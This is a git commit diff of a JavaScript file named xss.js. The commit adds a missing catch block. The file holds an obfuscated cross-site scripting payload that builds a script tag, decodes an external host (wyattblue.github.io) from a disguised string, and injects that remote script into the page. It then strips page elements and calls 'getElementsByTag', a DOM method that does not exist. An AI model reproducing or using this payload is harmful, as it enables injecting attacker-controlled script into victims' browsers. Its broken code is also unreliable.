e7e606f6b7766a70929b623a04141c0879905213
WyattBlue <57511737+WyattBlue@users.noreply.github.com>
2020-03-06 00:53:10 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,11 +1,10 @@
-
 let grab = "<script>d=document;a=d['create'['concat']('Element')]('script');a['src']='//wyattbluezgithubzio/xsszjs'['split']('z')['join'](String(1/2)[1]);d['body']['append'['concat']('Child')](a)</script>";
 
 console.log('working');
 
 try {
 	document.getElementsByClassName('aka-title')[0].outerHTML="";
-}
+} catch(e){}
 
 let spans = document.getElementsByTag('a');
 let len = spans.length;
